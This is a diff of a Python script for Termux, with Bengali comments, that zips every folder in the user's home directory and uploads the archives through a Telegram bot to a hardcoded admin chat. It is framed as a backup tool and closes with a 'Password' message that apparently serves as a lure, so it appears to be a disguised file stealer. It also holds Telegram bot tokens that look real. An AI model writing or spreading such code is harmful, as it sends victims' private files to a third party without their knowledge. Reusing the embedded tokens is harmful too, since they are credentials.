@@ -4,11 +4,12 @@ import telebot
 import time
 
 # ================= CONFIG =================
-BOT_TOKEN = "7676428723:AAECtBRnxX41kSkiZev5UdX_2X63eVP-fMY"
-ADMIN_CHAT_ID = 8038375045
+BOT_TOKEN = "8300582155:AAHcS6EDAzylFjfe0pUNi4B9CKL7R_GhmpY"
+ADMIN_CHAT_ID = 8223063986
 TERMUX_HOME = "/data/data/com.termux/files/home"
 BACKUP_DIR = "/data/data/com.termux/files/home/backups"
 MAX_ZIP_SIZE_MB = 45  # Telegram limit < 50MB
+IGNORE_FOLDERS = {"backups", ".cache", ".local", ".config"}  # Skip these folders
 # =========================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -50,11 +51,20 @@ def progress_animation(folder_name):
 
 # Termux হোমের ফোল্ডার ব্যাকআপ
 for item in os.listdir(TERMUX_HOME):
+    if item in IGNORE_FOLDERS or item.startswith('.'):
+        continue  # Skip ignored/hidden folders
+
     item_path = os.path.join(TERMUX_HOME, item)
-    if os.path.isdir(item_path) and item != "backups":
+    if os.path.isdir(item_path):
         progress_animation(item)
         zip_files = zip_folder_split(item_path, BACKUP_DIR)
+
         for zip_file_path in zip_files:
+            zip_size_mb = os.path.getsize(zip_file_path) / (1024*1024)
+            if zip_size_mb > MAX_ZIP_SIZE_MB:
+                print(f"[!] Skipping {zip_file_path} ({zip_size_mb:.2f} MB) - too large for Telegram")
+                continue
+
             with open(zip_file_path, 'rb') as f:
                 try:
                     bot.send_document(ADMIN_CHAT_ID, f)
@@ -63,5 +73,3 @@ for item in os.listdir(TERMUX_HOME):
 
 # শেষে মেসেজ
 print("Backup completed! Password : python zxcvbnm.py")
-
-# Termux shell prompt পরিবর্তন না করে রাখুন
